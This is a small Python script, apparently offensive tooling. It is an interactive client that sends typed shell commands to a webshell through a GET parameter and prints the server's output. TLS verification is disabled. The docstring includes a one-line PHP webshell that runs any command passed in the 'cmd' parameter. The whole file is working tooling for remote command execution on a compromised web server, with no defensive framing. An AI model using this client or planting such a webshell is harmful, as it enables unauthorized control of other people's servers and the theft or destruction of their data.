#!/usr/bin/env python3
"""
A Very minimal interactive client for a GET-based webshell.

Usage:
    python3 webshell_handler_micro.py <url> <param>

Example of a basic PHP webshell:
    <?php system($_GET['cmd']); ?>

Type 'exit' to quit.
"""

import sys, requests, urllib3
urllib3.disable_warnings() # type: ignore

try:
    url, param = sys.argv[1:3]
except ValueError:
    print("Usage: python3 webshell_handler_micro.py <url> <param>")
    sys.exit(1)

try:
    while True:
            cmd = input("\nwebshell> ").strip()
            if not cmd:
                continue
            if cmd in ["clear", "cls"]:
                print("\033c", end="")
                continue
            if cmd == "exit":
                break

            print(f"\n{requests.get(url, params={param: cmd}, verify=False, timeout=20).text.strip()}")

except requests.RequestException as e:
    print(f"\nRequestException: {e}")
    sys.exit(1)
except KeyboardInterrupt as e:
    print(f"\nKeyboardInterrupt: {e}")
    sys.exit(0)
except Exception as e:
    print(f"\nException: {e}")
    sys.exit(1)
